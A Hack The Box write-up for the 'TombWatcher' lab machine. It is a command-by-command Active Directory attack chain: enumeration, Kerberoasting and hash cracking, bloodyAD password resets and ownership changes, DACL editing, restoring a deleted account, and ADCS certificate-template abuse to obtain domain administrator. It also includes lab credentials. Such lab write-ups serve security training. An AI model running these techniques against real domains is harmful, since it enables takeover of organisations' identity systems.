# TombWatcher HTB Report

## 1. Initial Enumeration

We started by scanning the target machine to identify open ports and services.

```bash
nmap -p- -sS -vvv 10.10.11.72
nxc smb 10.10.11.72 | grep "domain:" | sed 's/.*(name:\([^)]*\)).*(domain:\([^)]*\)).*/\1 \2/' | while read NAME DOMAIN; do echo "10.10.11.72    $NAME $NAME.$DOMAIN $DOMAIN"; done | sudo tee -a /etc/hosts
```

## 2. User Enumeration

With the initial information, we proceeded to enumerate users using LDAP.

```bash
nxc ldap 10.10.11.72 -u 'henry' -p 'H3nry_987TGV!' --bloodhound --collection All --dns-server 10.10.11.72
```

## 3. Kerberoasting

We then attempted to extract service account hashes through Kerberoasting.

```bash
targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
```

## 4. Password Cracking

The captured hash was cracked using John the Ripper and a wordlist.

```bash
/john --wordlist=/home/user/wordlists/rockyou.txt /home/user/htb/tombwatcher/hashes.txt
```

**Cracked Password:** `basketball` for user `alfred`.

## 5. Privilege Escalation

### 5.1. Adding User to Group

We added the `alfred` user to the `INFRASTRUCTURE` group.

```bash
bloodyAD --host '10.10.11.72' -d 'DC01.tombwatcher.htb' -u 'alfred' -p 'basketball'  add groupMember 'INFRASTRUCTURE' alfred
```

### 5.2. Retrieving Managed Password

We retrieved the managed password for the `ANSIBLE_DEV$` account.

```bash
bloodyAD -u alfred -d 'DC01.tombwatcher.htb' -p basketball --host '10.10.11.72' get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword
```

### 5.3. Setting New Password

We set a new password for the `SAM` user.

```bash
bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u 'ANSIBLE_DEV$' -p :7bc5a56af89da4d3c03bc048055350f2 set password SAM "newP@ssword2025"
```

### 5.4. Taking Ownership

We took ownership of the `JOHN` object.

```bash
bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u SAM -p "newP@ssword2025" set owner JOHN SAM
```

### 5.5. Gaining Full Control

Finally, we granted `FullControl` rights to the `SAM` user over the `JOHN` object.

```bash
dacledit.py -action 'write' -rights 'FullControl' -principal 'SAM' -target 'JOHN' 'tombwatcher.htb'/'SAM':'newP@ssword2025'
```

### 5.6 Change Password of JOHN
```bash
bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u 'SAM' -p 'newP@ssword2025' set password JOHN "newP@ssword2025"
```

# Login with evil-winrm-py
```bash
evil-winrm-py -i 10.10.11.72 -u JOHN -p "newP@ssword2025"
```

# Enumerate CA, templates, and highlight vulns (ESC1/2/3/6/7/8)
```bash
certipy find -u 'JOHN@tombwatcher.htb' -p 'newP@ssword2025' -dc-ip 10.10.11.72 -vulnerable -stdout
```

# Find deleted accounts:
```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties *
```

# Restore deleted accounts:
```powershell
Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"
```
# Enable cert_admin account
```bash
Enable-ADAccount -Identity cert_admin
```

# Change cert_admin password using bloodyAD
```bash
Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force)
```

# Find vulnerable templates
```bash
certipy find -u 'cert_admin@tombwatcher.htb' -p 'P@ssw0rd123!' -dc-ip 10.10.11.72 -vulnerable -stdout
```

certipy req -u 'cert_admin@tombwatcher.htb' -p 'P@ssw0rd123!' -ca 'tombwatcher-CA-1' -template 'User' -dc-ip 10.10.11.72

certipy auth -pfx cert_admin.pfx -dc-ip 10.10.11.72

```bash
certipy req -u 'cert_admin@tombwatcher.htb' -p 'P@ssw0rd123!' -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -application-policies 'Client Authentication'
```
#login as admin
```bash
certipy auth -dc-ip '10.10.11.72' -pfx 'administrator.pfx' -domain 'tombwatcher.htb' -ldap-shell
```

# alternativa mudar o password com bloodyAD
```bash
bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -k pfx=administrator.pfx set password 'administrator' 'NewPassw0rd!'
```
